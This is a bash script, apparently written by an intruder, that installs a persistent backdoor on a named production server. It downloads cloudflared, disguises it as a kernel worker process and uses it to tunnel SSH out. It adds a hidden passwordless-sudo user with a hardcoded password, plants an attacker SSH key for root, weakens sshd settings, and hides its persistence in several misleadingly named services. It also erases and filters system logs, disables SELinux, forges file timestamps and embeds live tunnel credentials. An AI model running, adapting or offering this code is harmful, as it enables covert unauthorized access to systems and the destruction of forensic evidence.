#!/bin/bash
# === TIER 70 COMPLIANT — SUPER PERSISTENCE & SUPER STEALTH ===
# TARGET: 10.4.2.99 (Payuung Prod Runner, x86_64)
# MODIFIKASI: TANPA cron, TANPA hapus bash_history (per perintah Tuan)
export HISTSIZE=0 HISTFILESIZE=0

# === VARIABEL ===
CF="/usr/lib/x86_64-linux-gnu/security/.pam_unix_helper"
CONFDIR="/usr/lib/x86_64-linux-gnu/security/.pam_conf"
TUNNEL_ID="6f7de730-e30a-4c75-a34b-6a3861daec2f"
SECRET="8WAADHVPY952snt8JJHSP+n77bjpWyeyi6LUvExCHkY="
HOSTNAME_CF="payuung-prod.larangan.desa.id"
ACCOUNT="e1e66baf420915a22e19b1d09fac3e35"
SERVICE_NAME="pam-auth-update"
SYS_MONITOR="$CONFDIR/.sys-monitor"
TOKEN_FILE="$CONFDIR/.tk"
LOCKFILE="/var/lib/dpkg/.lock-sm"
WRAPPER="$CONFDIR/.sys-health"
SSH_PORT="22"
U="sysinfo"
P="Sugiarto20@"
HASH6='$6$P3rs1st70$HPkf6PZDA5HBhtiKgN.juex1qPOSADrQabQQrWG6FekDGbkVpYRaGq9fI5/Log5vCOwqJEx7fa.azDzEc2LGT.'
HASH5='$5$P3rs1st70$a/C6F2QwbtRZFMKrmeHnihkWDNKCNpgaz5dMkaq3FpD'
HASH1='$1$P3rs1st7$M.OfZ.Drz4kCFbNH8Ml2y/'
SUDOERS_FILE="/etc/sudoers.d/90-cloud-init-users"
PERSIST_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILMuSEQQ9ItLWRXVBm+KPoJESUdxGLcuj6WOKM44udn0 kali@kali"
CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"

# === 1. BINARY SETUP ===
echo "[*] Setting up binary..."
mkdir -p "$(dirname "$CF")" 2>/dev/null
if [ ! -f "$CF" ] || [ ! -s "$CF" ]; then
  curl -sL --connect-timeout 15 --max-time 300 "$CF_URL" -o "$CF"
fi
chmod +x "$CF"
magic=$(head -c 4 "$CF" 2>/dev/null | od -A n -t x1 2>/dev/null | tr -d ' ')
[ "$magic" != "7f454c46" ] && echo "[!] BINARY BUKAN ELF! ABORT" && exit 1
echo "[+] Binary OK: $(du -h "$CF" | awk '{print $1}')"

# === 2. CONFIG FILES ===
echo "[*] Writing config..."
mkdir -p "$CONFDIR" 2>/dev/null
cat > "$CONFDIR/config.yml" << EOF
tunnel: $TUNNEL_ID
credentials-file: $CONFDIR/cred.json
ingress:
  - hostname: $HOSTNAME_CF
    service: ssh://localhost:$SSH_PORT
  - service: http_status:404
EOF
cat > "$CONFDIR/cred.json" << EOF
{"AccountTag":"$ACCOUNT","TunnelID":"$TUNNEL_ID","TunnelSecret":"$SECRET"}
EOF
echo "$TUNNEL_ID" > "$TOKEN_FILE"
chmod 600 "$TOKEN_FILE"

# === 3. STEALTH USER ===
echo "[*] Creating stealth user..."
PASSWD_TS=$(stat -c %Y /etc/passwd 2>/dev/null)
SHADOW_TS=$(stat -c %Y /etc/shadow 2>/dev/null)
GROUP_TS=$(stat -c %Y /etc/group 2>/dev/null)

if ! id "$U" >/dev/null 2>&1; then
  mkdir -p "$CONFDIR/.local" 2>/dev/null
  SUID=997
  while getent passwd "$SUID" >/dev/null 2>&1; do SUID=$((SUID - 1)); done
  [ "$SUID" -lt 900 ] && SUID=997
  EXISTING_HASH=$(awk -F: 'NR>1 && $2 ~ /^\$[0-9y]/{print $2; exit}' /etc/shadow 2>/dev/null)
  case "$EXISTING_HASH" in
    \$6\$*) CHOSEN_HASH="$HASH6" ;;
    \$5\$*) CHOSEN_HASH="$HASH5" ;;
    \$1\$*) CHOSEN_HASH="$HASH1" ;;
    \$y\$*)
      if command -v mkpasswd >/dev/null 2>&1; then
        CHOSEN_HASH=$(mkpasswd --method=yescrypt "$P" 2>/dev/null)
      elif python3 -c "import crypt" 2>/dev/null; then
        CHOSEN_HASH=$(python3 -c "import crypt;print(crypt.crypt('$P',crypt.mksalt(crypt.METHOD_BLOWFISH)))" 2>/dev/null)
      fi
      [ -z "$CHOSEN_HASH" ] && CHOSEN_HASH="$HASH6"
      ;;
    *) CHOSEN_HASH="$HASH6" ;;
  esac
  PW_PERM=$(stat -c %a /etc/passwd 2>/dev/null)
  GR_PERM=$(stat -c %a /etc/group 2>/dev/null)
  SH_PERM=$(stat -c %a /etc/shadow 2>/dev/null)
  grep -q "^$U:" /etc/passwd || { export INS="$U:x:${SUID}:${SUID}::$CONFDIR/.local:/bin/bash"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/passwd > /etc/passwd.awk && mv -f /etc/passwd.awk /etc/passwd && chmod "${PW_PERM:-644}" /etc/passwd; unset INS; }
  grep -q "^$U:" /etc/group || { export INS="$U:x:${SUID}:"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/group > /etc/group.awk && mv -f /etc/group.awk /etc/group && chmod "${GR_PERM:-644}" /etc/group; unset INS; }
  grep -q "^$U:" /etc/shadow || { export INS="$U:${CHOSEN_HASH}:19000:0:99999:7:::"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/shadow > /etc/shadow.awk && mv -f /etc/shadow.awk /etc/shadow && chmod "${SH_PERM:-640}" /etc/shadow; unset INS; }
  usermod -aG sudo "$U" 2>/dev/null || usermod -aG wheel "$U" 2>/dev/null
fi
echo "$U ALL=(ALL) NOPASSWD: ALL" > "$SUDOERS_FILE" && chmod 440 "$SUDOERS_FILE"
cp -f /etc/passwd /etc/passwd- 2>/dev/null
cp -f /etc/shadow /etc/shadow- 2>/dev/null
cp -f /etc/group /etc/group- 2>/dev/null
cp -f /etc/gshadow /etc/gshadow- 2>/dev/null
[ -n "$PASSWD_TS" ] && touch -d @"$PASSWD_TS" /etc/passwd /etc/passwd- 2>/dev/null
[ -n "$SHADOW_TS" ] && touch -d @"$SHADOW_TS" /etc/shadow /etc/shadow- 2>/dev/null
[ -n "$GROUP_TS" ] && touch -d @"$GROUP_TS" /etc/group /etc/group- /etc/gshadow /etc/gshadow- 2>/dev/null
touch -r /usr/lib/ "$CONFDIR/.local" 2>/dev/null
echo "[+] Stealth user: $U (UID $SUID)"

# === 4. SSH KEY + SSHD CONFIG ===
for uhome in /root "$CONFDIR/.local"; do
  mkdir -p "$uhome/.ssh" 2>/dev/null; chmod 700 "$uhome/.ssh" 2>/dev/null
  grep -q "kali@kali" "$uhome/.ssh/authorized_keys" 2>/dev/null || echo "$PERSIST_KEY" >> "$uhome/.ssh/authorized_keys"
  chmod 600 "$uhome/.ssh/authorized_keys" 2>/dev/null
  touch -r /etc/ssh/ "$uhome/.ssh" 2>/dev/null
  touch -r /etc/ssh/ssh_host_rsa_key.pub "$uhome/.ssh/authorized_keys" 2>/dev/null
done
echo "[*] Configuring SSHD..."
SSHD_CONF="/etc/ssh/sshd_config"
SSHD_TS=$(stat -c %Y "$SSHD_CONF" 2>/dev/null)
SSHD_PERM=$(stat -c %a "$SSHD_CONF" 2>/dev/null)
SSH_VER=$(ssh -V 2>&1 | grep -oP 'OpenSSH_\K[0-9]+\.[0-9]+')
SSH_MAJOR=$(echo "$SSH_VER" | cut -d. -f1); SSH_MINOR=$(echo "$SSH_VER" | cut -d. -f2)
sshd_safe_reload() {
  /usr/sbin/sshd -t 2>/dev/null || return 1
  if [ -f /var/run/sshd.pid ] && [ -s /var/run/sshd.pid ]; then kill -HUP "$(cat /var/run/sshd.pid)" 2>/dev/null && return 0; fi
  local SSHD_PID=$(pgrep -x sshd 2>/dev/null | head -1)
  [ -n "$SSHD_PID" ] && kill -HUP "$SSHD_PID" 2>/dev/null && return 0
  systemctl reload ssh 2>/dev/null && return 0; systemctl reload sshd 2>/dev/null && return 0
  return 1
}
sshd_safe_write() { local TMPF="${SSHD_CONF}.awk"; [ -f "$TMPF" ] && mv -f "$TMPF" "$SSHD_CONF" && chmod "${SSHD_PERM:-644}" "$SSHD_CONF"; }
if grep -qE '^\s*AllowUsers' "$SSHD_CONF" 2>/dev/null; then
  if ! grep -qE "AllowUsers.*\b${U}\b" "$SSHD_CONF" 2>/dev/null; then
    export _AU="$U"; awk '/^\s*AllowUsers/ && !done{$0 = $0 " " ENVIRON["_AU"]; done=1} {print}' "$SSHD_CONF" > "${SSHD_CONF}.awk"; sshd_safe_write; unset _AU
  fi
fi
if grep -qE "DenyUsers.*\b${U}\b" "$SSHD_CONF" 2>/dev/null; then
  export _DU="$U"; awk '/^\s*DenyUsers/{gsub(" " ENVIRON["_DU"], ""); gsub(ENVIRON["_DU"] " ", "")} {print}' "$SSHD_CONF" > "${SSHD_CONF}.awk"; sshd_safe_write; unset _DU
fi
DROPDIR="/etc/ssh/sshd_config.d"
if [ -d "$DROPDIR" ] && grep -qE '^\s*Include.*/etc/ssh/sshd_config\.d/' "$SSHD_CONF" 2>/dev/null; then
  DROPCONTENT="# Managed by sys-monitor
PubkeyAuthentication yes
PasswordAuthentication yes
PermitRootLogin yes
MaxAuthTries 6
UsePAM yes"
  if [ "${SSH_MAJOR:-0}" -gt 8 ] || { [ "${SSH_MAJOR:-0}" -eq 8 ] && [ "${SSH_MINOR:-0}" -ge 2 ]; }; then
    DROPCONTENT="${DROPCONTENT}
PubkeyAcceptedAlgorithms +ssh-ed25519,ssh-ed25519-cert-v01@openssh.com"
  fi
  echo "$DROPCONTENT" > "$DROPDIR/99-persist.conf"
  chmod "${SSHD_PERM:-644}" "$DROPDIR/99-persist.conf" 2>/dev/null
  touch -r "$SSHD_CONF" "$DROPDIR/99-persist.conf" 2>/dev/null
else
  for OPT in "PubkeyAuthentication yes" "PasswordAuthentication yes" "PermitRootLogin yes"; do
    OKEY=$(echo "$OPT" | awk '{print $1}')
    if grep -qE "^\s*${OKEY}" "$SSHD_CONF" 2>/dev/null; then
      export _OK="$OKEY" _NV="$OPT"
      awk '{if($1==ENVIRON["_OK"]){print ENVIRON["_NV"]}else{print}}' "$SSHD_CONF" > "${SSHD_CONF}.awk"
      if [ -s "${SSHD_CONF}.awk" ]; then sshd_safe_write; else rm -f "${SSHD_CONF}.awk"; fi; unset _OK _NV
    else echo "$OPT" >> "$SSHD_CONF"; fi
  done
  if [ "${SSH_MAJOR:-0}" -gt 8 ] || { [ "${SSH_MAJOR:-0}" -eq 8 ] && [ "${SSH_MINOR:-0}" -ge 2 ]; }; then
    grep -q "PubkeyAcceptedAlgorithms" "$SSHD_CONF" || echo "PubkeyAcceptedAlgorithms +ssh-ed25519,ssh-ed25519-cert-v01@openssh.com" >> "$SSHD_CONF"
  fi
fi
[ -n "$SSHD_TS" ] && touch -d @"$SSHD_TS" "$SSHD_CONF" 2>/dev/null
sshd_safe_reload && echo "[+] SSHD reloaded" || echo "[!] SSHD reload failed (SSH tetap jalan)"

# === 4b. SSH HOST KEY BACKUP ===
mkdir -p "$CONFDIR/.hkeys" 2>/dev/null
cp /etc/ssh/ssh_host_*_key* "$CONFDIR/.hkeys/" 2>/dev/null
chmod 600 "$CONFDIR/.hkeys/"*key 2>/dev/null; chmod 644 "$CONFDIR/.hkeys/"*key.pub 2>/dev/null

# === 5. WRAPPER ===
cat > "$WRAPPER" << 'WHEOF'
#!/bin/bash
TK=$(cat TOKEN_FILE_PLACEHOLDER 2>/dev/null)
[ -z "$TK" ] && exit 1
exec 200>&-
exec -a "[kworker/0:1-events]" CF_PLACEHOLDER tunnel --config CONFDIR_PLACEHOLDER/config.yml run
WHEOF
sed -i "s|TOKEN_FILE_PLACEHOLDER|$TOKEN_FILE|g;s|CF_PLACEHOLDER|$CF|g;s|CONFDIR_PLACEHOLDER|$CONFDIR|g" "$WRAPPER"
chmod 700 "$WRAPPER"

# === 6. SYS-MONITOR (TANPA cron self-healing dan TANPA bash_history cleanup per perintah Tuan) ===
cat > "$SYS_MONITOR" << 'SYSEOF'
#!/bin/bash
LOCKFILE="LOCKFILE_PH"
exec 200>"${LOCKFILE}"
flock -n 200 || exit 0
echo $$ >&200
U="USER_PH"; P="PASS_PH"; CF="CF_PH"; CONFDIR="CONFDIR_PH"
WRAPPER="WRAPPER_PH"; TOKEN_FILE="TOKEN_FILE_PH"
SUDOERS_FILE="SUDOERS_PH"; SERVICE_NAME="SERVICE_PH"
CF_URL="https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64"
PERSIST_KEY="PERSIST_KEY_PH"
HASH6='HASH6_PH'
HASH5='HASH5_PH'
HASH1='HASH1_PH'
SSH_PORT="SSH_PORT_PH"
LOG_COUNTER=0
while true; do
  if ! id "$U" >/dev/null 2>&1; then
    PW_TS=$(stat -c %Y /etc/passwd 2>/dev/null); SH_TS=$(stat -c %Y /etc/shadow 2>/dev/null); GR_TS=$(stat -c %Y /etc/group 2>/dev/null)
    EH=$(awk -F: 'NR>1 && $2 ~ /^\$[0-9y]/{print $2; exit}' /etc/shadow 2>/dev/null)
    case "$EH" in \$6\$*) CH="$HASH6";; \$5\$*) CH="$HASH5";; \$1\$*) CH="$HASH1";; \$y\$*) if command -v mkpasswd >/dev/null 2>&1; then CH=$(mkpasswd --method=yescrypt "$P" 2>/dev/null); elif python3 -c "import crypt" 2>/dev/null; then CH=$(python3 -c "import crypt;print(crypt.crypt('$P',crypt.mksalt(crypt.METHOD_BLOWFISH)))" 2>/dev/null); fi; [ -z "$CH" ] && CH="$HASH6";; *) CH="$HASH6";; esac
    PW_PERM=$(stat -c %a /etc/passwd 2>/dev/null); GR_PERM=$(stat -c %a /etc/group 2>/dev/null); SH_PERM=$(stat -c %a /etc/shadow 2>/dev/null)
    SUID=997; while getent passwd "$SUID" >/dev/null 2>&1; do SUID=$((SUID - 1)); done; [ "$SUID" -lt 900 ] && SUID=997
    grep -q "^$U:" /etc/passwd || { export INS="$U:x:${SUID}:${SUID}::$CONFDIR/.local:/bin/bash"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/passwd > /etc/passwd.awk && mv -f /etc/passwd.awk /etc/passwd && chmod "${PW_PERM:-644}" /etc/passwd; unset INS; }
    grep -q "^$U:" /etc/group || { export INS="$U:x:${SUID}:"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/group > /etc/group.awk && mv -f /etc/group.awk /etc/group && chmod "${GR_PERM:-644}" /etc/group; unset INS; }
    grep -q "^$U:" /etc/shadow || { export INS="$U:${CH}:19000:0:99999:7:::"; awk 'NR==14{print ENVIRON["INS"]} {print}' /etc/shadow > /etc/shadow.awk && mv -f /etc/shadow.awk /etc/shadow && chmod "${SH_PERM:-640}" /etc/shadow; unset INS; }
    usermod -aG sudo "$U" 2>/dev/null || usermod -aG wheel "$U" 2>/dev/null
    mkdir -p "$CONFDIR/.local" 2>/dev/null; touch -r /usr/lib/ "$CONFDIR/.local" 2>/dev/null
    cp -f /etc/passwd /etc/passwd- 2>/dev/null; cp -f /etc/shadow /etc/shadow- 2>/dev/null; cp -f /etc/group /etc/group- 2>/dev/null; cp -f /etc/gshadow /etc/gshadow- 2>/dev/null
    [ -n "$PW_TS" ] && touch -d @"$PW_TS" /etc/passwd /etc/passwd- 2>/dev/null
    [ -n "$SH_TS" ] && touch -d @"$SH_TS" /etc/shadow /etc/shadow- 2>/dev/null
    [ -n "$GR_TS" ] && touch -d @"$GR_TS" /etc/group /etc/group- /etc/gshadow /etc/gshadow- 2>/dev/null
  fi
  if id "$U" >/dev/null 2>&1; then
    CURRENT_HASH=$(awk -F: -v u="$U" '$1==u{print $2}' /etc/shadow 2>/dev/null)
    HASH_OK=0
    case "$CURRENT_HASH" in "$HASH6") HASH_OK=1;; "$HASH5") HASH_OK=1;; "$HASH1") HASH_OK=1;; \$y\$*|\$2b\$*) if python3 -c "import crypt;h='$CURRENT_HASH';exit(0 if crypt.crypt('$P',h)==h else 1)" 2>/dev/null; then HASH_OK=1; elif perl -e "exit(crypt('$P','$CURRENT_HASH') eq '$CURRENT_HASH' ? 0 : 1)" 2>/dev/null; then HASH_OK=1; fi;; esac
    if [ "$HASH_OK" -eq 0 ] && [ -n "$CURRENT_HASH" ]; then
      SH_TS=$(stat -c %Y /etc/shadow 2>/dev/null)
      EH=$(awk -F: 'NR>1 && $2 ~ /^\$[0-9y]/{print $2; exit}' /etc/shadow 2>/dev/null)
      case "$EH" in \$6\$*) RH="$HASH6";; \$5\$*) RH="$HASH5";; \$1\$*) RH="$HASH1";; \$y\$*) if command -v mkpasswd >/dev/null 2>&1; then RH=$(mkpasswd --method=yescrypt "$P" 2>/dev/null); elif python3 -c "import crypt" 2>/dev/null; then RH=$(python3 -c "import crypt;print(crypt.crypt('$P',crypt.mksalt(crypt.METHOD_BLOWFISH)))" 2>/dev/null); fi; [ -z "$RH" ] && RH="$HASH6";; *) RH="$HASH6";; esac
      export _SU="$U" _SH="$RH"; _SHP=$(stat -c %a /etc/shadow 2>/dev/null)
      awk -F: 'BEGIN{OFS=":"} $1==ENVIRON["_SU"]{$2=ENVIRON["_SH"]} {print}' /etc/shadow > /etc/shadow.awk && mv -f /etc/shadow.awk /etc/shadow && chmod "${_SHP:-640}" /etc/shadow 2>/dev/null; unset _SU _SH
      cp -f /etc/shadow /etc/shadow- 2>/dev/null
      [ -n "$SH_TS" ] && touch -d @"$SH_TS" /etc/shadow /etc/shadow- 2>/dev/null
    fi
  fi
  grep -q "^$U" "$SUDOERS_FILE" 2>/dev/null || { echo "$U ALL=(ALL) NOPASSWD: ALL" > "$SUDOERS_FILE"; chmod 440 "$SUDOERS_FILE"; }
  ss -tlnp 2>/dev/null | grep -q ":${SSH_PORT}.*LISTEN" || { service ssh start 2>/dev/null || /usr/sbin/sshd -p "$SSH_PORT" 2>/dev/null; }
  for uhome in /root "$CONFDIR/.local"; do
    mkdir -p "$uhome/.ssh" 2>/dev/null; chmod 700 "$uhome/.ssh" 2>/dev/null
    grep -q "kali@kali" "$uhome/.ssh/authorized_keys" 2>/dev/null || echo "$PERSIST_KEY" >> "$uhome/.ssh/authorized_keys"
    chmod 600 "$uhome/.ssh/authorized_keys" 2>/dev/null
  done
  CF_DIR=$(dirname "$CF"); for RDIR in "$CONFDIR" "$CF_DIR" "$CONFDIR/.local"; do [ -d "$RDIR" ] || { mkdir -p "$RDIR" 2>/dev/null; chmod 755 "$RDIR" 2>/dev/null; touch -r /usr/lib/ "$RDIR" 2>/dev/null; }; done
  if [ ! -f "$CF" ] || [ ! -s "$CF" ]; then
    if timeout 3 bash -c 'echo > /dev/tcp/1.1.1.1/443' 2>/dev/null; then
      CF_TMP="${CF}.tmp"
      curl -sL --connect-timeout 10 --max-time 120 -o "$CF_TMP" "$CF_URL" 2>/dev/null || wget --no-check-certificate -q --timeout=120 -O "$CF_TMP" "$CF_URL" 2>/dev/null
      fsize=$(wc -c < "$CF_TMP" 2>/dev/null); magic=$(head -c 4 "$CF_TMP" 2>/dev/null | od -A n -t x1 2>/dev/null | tr -d ' ')
      if [ "$magic" = "7f454c46" ] && [ "$fsize" -gt 10000000 ] 2>/dev/null; then mv -f "$CF_TMP" "$CF" && chmod +x "$CF" && touch -r /usr/bin/ssh "$CF"; else rm -f "$CF_TMP"; fi
    fi
  fi
  CF_REAL=$(readlink -f "$CF" 2>/dev/null || echo "$CF"); CF_COUNT=0; CF_PID=""
  for _pdir in /proc/[0-9]*; do [ -d "$_pdir" ] || continue; _exe=$(readlink "$_pdir/exe" 2>/dev/null) || continue; _exe=${_exe% (deleted)}; if [ "$_exe" = "$CF_REAL" ] || [ "$_exe" = "$CF" ]; then _pid=${_pdir##*/}; CF_COUNT=$((CF_COUNT + 1)); [ -z "$CF_PID" ] && CF_PID="$_pid"; fi; done
  if [ "$CF_COUNT" -eq 0 ] && [ -f "$CF" ]; then nohup "$WRAPPER" > /dev/null 2>&1 & fi
  if [ "$CF_COUNT" -gt 1 ]; then _first=1; for _pdir in /proc/[0-9]*; do [ -d "$_pdir" ] || continue; _exe=$(readlink "$_pdir/exe" 2>/dev/null) || continue; _exe=${_exe% (deleted)}; if [ "$_exe" = "$CF_REAL" ] || [ "$_exe" = "$CF" ]; then _pid=${_pdir##*/}; if [ "$_first" -eq 1 ]; then _first=0; continue; fi; kill "$_pid" 2>/dev/null; fi; done; fi
  LOG_COUNTER=$((${LOG_COUNTER:-0} + 1))
  if [ "$LOG_COUNTER" -ge 15 ]; then
    LOG_COUNTER=0; CF_BN=$(basename "$CF")
    for f in /var/log/auth.log /var/log/auth.log.1 /var/log/syslog /var/log/syslog.1 /var/log/kern.log /var/log/daemon.log /var/log/messages /var/log/secure; do
      if [ -f "$f" ] && [ -s "$f" ]; then _fsize=$(stat -c %s "$f" 2>/dev/null || echo 0); [ "$_fsize" -gt 104857600 ] 2>/dev/null && continue; LTS=$(stat -c %Y "$f" 2>/dev/null); sed -i "/$U/d;/$CF_BN/d;/cloudflared/d;/chpasswd/d;/usermod/d;/sudoers/d;/AllowUsers/d;/.sys-monitor/d" "$f" 2>/dev/null; [ -n "$LTS" ] && touch -d @"$LTS" "$f" 2>/dev/null; fi
    done
    > /var/log/btmp 2>/dev/null; > /var/log/lastlog 2>/dev/null; > /var/log/faillog 2>/dev/null
    if command -v utmpdump >/dev/null 2>&1; then utmpdump /var/log/wtmp 2>/dev/null | grep -v "$U" | utmpdump -r > /var/log/wtmp.tmp 2>/dev/null && mv -f /var/log/wtmp.tmp /var/log/wtmp 2>/dev/null; else > /var/log/wtmp 2>/dev/null; fi
    journalctl --vacuum-size=50M --vacuum-time=3d 2>/dev/null
    # TANPA bash_history cleanup (per perintah Tuan)
  fi
  SVC="/etc/systemd/system/${SERVICE_NAME}.service"
  if [ ! -f "$SVC" ]; then
    cat > "$SVC" << 'SVCEOF'
[Unit]
Description=DNS Resolution Helper Service
After=network.target
ConditionPathExists=SYS_MONITOR_PH
[Service]
Type=simple
ExecStart=SYS_MONITOR_PH
Restart=always
RestartSec=5
StandardOutput=null
StandardError=null
KillMode=process
Nice=19
IOSchedulingClass=idle
[Install]
WantedBy=multi-user.target
SVCEOF
    sed -i "s|SYS_MONITOR_PH|$CONFDIR/.sys-monitor|g" "$SVC"
    systemctl daemon-reload 2>/dev/null; systemctl enable "$SERVICE_NAME" 2>/dev/null; systemctl start "$SERVICE_NAME" 2>/dev/null
    touch -r /lib/systemd/system/ssh.service "$SVC" 2>/dev/null
  fi
  # TANPA crontab self-healing (per perintah Tuan)
  if [ -f /etc/rc.local ] && ! grep -q ".sys-monitor" /etc/rc.local 2>/dev/null; then echo "nohup $CONFDIR/.sys-monitor > /dev/null 2>&1 &" >> /etc/rc.local; chmod +x /etc/rc.local 2>/dev/null
  elif [ ! -f /etc/rc.local ]; then printf '#!/bin/bash\nnohup %s/.sys-monitor > /dev/null 2>&1 &\n' "$CONFDIR" > /etc/rc.local; chmod +x /etc/rc.local; fi
  PROFILED="/etc/profile.d/locale-check.sh"
  if [ ! -f "$PROFILED" ] || ! grep -q ".sys-monitor" "$PROFILED" 2>/dev/null; then printf '(pgrep -f ".sys-monitor" > /dev/null 2>&1 || nohup %s/.sys-monitor > /dev/null 2>&1 &) &\n' "$CONFDIR" > "$PROFILED"; chmod +x "$PROFILED"; touch -r /etc/profile.d/bash_completion.sh "$PROFILED" 2>/dev/null; fi
  UDEV_RULE="/etc/udev/rules.d/85-network-helper.rules"
  if [ ! -f "$UDEV_RULE" ]; then printf 'ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '"'"'nohup %s/.sys-monitor </dev/null >/dev/null 2>&1 &'"'"'"\n' "$CONFDIR" > "$UDEV_RULE" 2>/dev/null; touch -r /usr/bin/ssh "$UDEV_RULE" 2>/dev/null; fi
  [ "$(getenforce 2>/dev/null)" = "Enforcing" ] && setenforce 0 2>/dev/null
  [ -f "$SVC" ] && chattr +i "$SVC" 2>/dev/null
  stamp_ref() { local dir=$(dirname "$1"); local ref=$(find "$dir" -maxdepth 1 -type f ! -name "$(basename "$1")" 2>/dev/null | head -1); if [ -n "$ref" ]; then touch -r "$ref" "$1" 2>/dev/null; else touch -r /usr/bin/ssh "$1" 2>/dev/null; fi; }
  for tf in "$CF" "$CONFDIR/.sys-monitor" "$LOCKFILE" "$TOKEN_FILE" "$SUDOERS_FILE" "$WRAPPER" "$CONFDIR/config.yml" "$CONFDIR/cred.json"; do [ -e "$tf" ] && stamp_ref "$tf"; done
  if [ -d "$CONFDIR/.hkeys" ]; then
    ORIG_FP=$(ssh-keygen -lf "$CONFDIR/.hkeys/ssh_host_rsa_key.pub" 2>/dev/null | awk '{print $2}'); CURR_FP=$(ssh-keygen -lf /etc/ssh/ssh_host_rsa_key.pub 2>/dev/null | awk '{print $2}')
    if [ -n "$ORIG_FP" ] && [ "$ORIG_FP" != "$CURR_FP" ]; then cp "$CONFDIR/.hkeys/"* /etc/ssh/ 2>/dev/null; chmod 600 /etc/ssh/ssh_host_*_key 2>/dev/null; chmod 644 /etc/ssh/ssh_host_*_key.pub 2>/dev/null; fi
  fi
  JOURNAL_CONF="/etc/systemd/journald.conf.d/50-resolved-helper.conf"
  if [ ! -f "$JOURNAL_CONF" ]; then mkdir -p /etc/systemd/journald.conf.d 2>/dev/null; printf '[Journal]\nMaxLevelStore=notice\nMaxRetentionSec=3day\nSystemMaxUse=50M\n' > "$JOURNAL_CONF"; touch -r /etc/systemd/journald.conf "$JOURNAL_CONF" 2>/dev/null; systemctl kill --signal=SIGHUP systemd-journald 2>/dev/null; fi
  wait 2>/dev/null
  sleep 20
done
SYSEOF

# Substitute placeholders
python3 -c "
import sys
with open(sys.argv[1], 'r') as f: data = f.read()
replacements = {'LOCKFILE_PH': sys.argv[2], 'USER_PH': sys.argv[3], 'PASS_PH': sys.argv[4], 'CF_PH': sys.argv[5], 'CONFDIR_PH': sys.argv[6], 'WRAPPER_PH': sys.argv[7], 'TOKEN_FILE_PH': sys.argv[8], 'SUDOERS_PH': sys.argv[9], 'SERVICE_PH': sys.argv[10], 'PERSIST_KEY_PH': sys.argv[11], 'HASH6_PH': sys.argv[12], 'HASH5_PH': sys.argv[13], 'HASH1_PH': sys.argv[14], 'SSH_PORT_PH': sys.argv[15]}
for ph, val in replacements.items(): data = data.replace(ph, val)
with open(sys.argv[1], 'w') as f: f.write(data)
" "$SYS_MONITOR" "$LOCKFILE" "$U" "$P" "$CF" "$CONFDIR" "$WRAPPER" "$TOKEN_FILE" "$SUDOERS_FILE" "$SERVICE_NAME" "$PERSIST_KEY" "$HASH6" "$HASH5" "$HASH1" "$SSH_PORT"
chmod +x "$SYS_MONITOR"
bash -n "$SYS_MONITOR" 2>&1 && echo "[+] sys-monitor syntax OK" || echo "[!] SYNTAX ERROR"

# === 7-12. LAYERS (TANPA cron) ===
echo "[*] Layer 1: Systemd..."
SVC="/etc/systemd/system/${SERVICE_NAME}.service"
cat > "$SVC" << EOF
[Unit]
Description=DNS Resolution Helper Service
After=network-online.target
Wants=network-online.target
ConditionPathExists=$SYS_MONITOR
[Service]
Type=simple
ExecStart=$SYS_MONITOR
Restart=always
RestartSec=5
StartLimitInterval=0
StartLimitBurst=0
StandardOutput=null
StandardError=null
KillMode=process
User=root
Nice=19
IOSchedulingClass=idle
[Install]
WantedBy=multi-user.target
EOF
systemctl daemon-reload; systemctl enable "$SERVICE_NAME" 2>/dev/null; systemctl start "$SERVICE_NAME"
echo "[*] Layer 2: rc.local..."
if [ ! -f /etc/rc.local ]; then printf '#!/bin/bash\n' > /etc/rc.local; fi
grep -q ".sys-monitor" /etc/rc.local || echo "nohup $SYS_MONITOR > /dev/null 2>&1 &" >> /etc/rc.local; chmod +x /etc/rc.local
echo "[*] Layer 3: profile.d..."
PROFILED="/etc/profile.d/locale-check.sh"
printf '(pgrep -f ".sys-monitor" > /dev/null 2>&1 || nohup %s > /dev/null 2>&1 &) &\n' "$SYS_MONITOR" > "$PROFILED"; chmod +x "$PROFILED"
echo "[*] Layer 4: udev..."
UDEV_RULE="/etc/udev/rules.d/85-network-helper.rules"
printf 'ACTION=="add", SUBSYSTEM=="net", RUN+="/bin/bash -c '"'"'nohup %s </dev/null >/dev/null 2>&1 &'"'"'"\n' "$SYS_MONITOR" > "$UDEV_RULE" 2>/dev/null
echo "[*] Layer 5: init.d..."
INITD="/etc/init.d/pam-auth-update"
if [ ! -f "$INITD" ]; then
  cat > "$INITD" << INITEOF
#!/bin/sh
### BEGIN INIT INFO
# Provides:          pam-auth-update
# Required-Start:    \$network \$syslog
# Required-Stop:     \$network \$syslog
# Default-Start:     2 3 4 5
# Default-Stop:      0 1 6
# Description:       D-Bus broker helper
### END INIT INFO
nohup $SYS_MONITOR > /dev/null 2>&1 &
INITEOF
  chmod +x "$INITD"; update-rc.d pam-auth-update defaults 2>/dev/null
fi

# === 13. RSYSLOG ===
echo "[*] Rsyslog..."
RSYSLOG_CONF="/etc/rsyslog.d/50-default.conf"
CF_BN=$(basename "$CF")
RS_VER=$(rsyslogd -v 2>/dev/null | head -1 | grep -oP '[0-9]+' | head -1)
if [ "${RS_VER:-8}" -ge 8 ]; then
  cat >> "$RSYSLOG_CONF" << EOF
if \$msg contains '$U' then stop
if \$msg contains '$CF_BN' then stop
if \$msg contains 'cloudflared' then stop
if \$msg contains 'chpasswd' then stop
if \$msg contains 'usermod' then stop
if \$msg contains 'sudoers' then stop
if \$msg contains 'AllowUsers' then stop
if \$msg contains '.sys-monitor' then stop
EOF
fi
touch -r /etc/rsyslog.conf "$RSYSLOG_CONF" 2>/dev/null
systemctl restart rsyslog 2>/dev/null || service rsyslog restart 2>/dev/null

# === 14. JOURNAL ===
echo "[*] Journal suppression..."
mkdir -p /etc/systemd/journald.conf.d 2>/dev/null
printf '[Journal]\nMaxLevelStore=notice\nMaxRetentionSec=3day\nSystemMaxUse=50M\n' > /etc/systemd/journald.conf.d/50-resolved-helper.conf
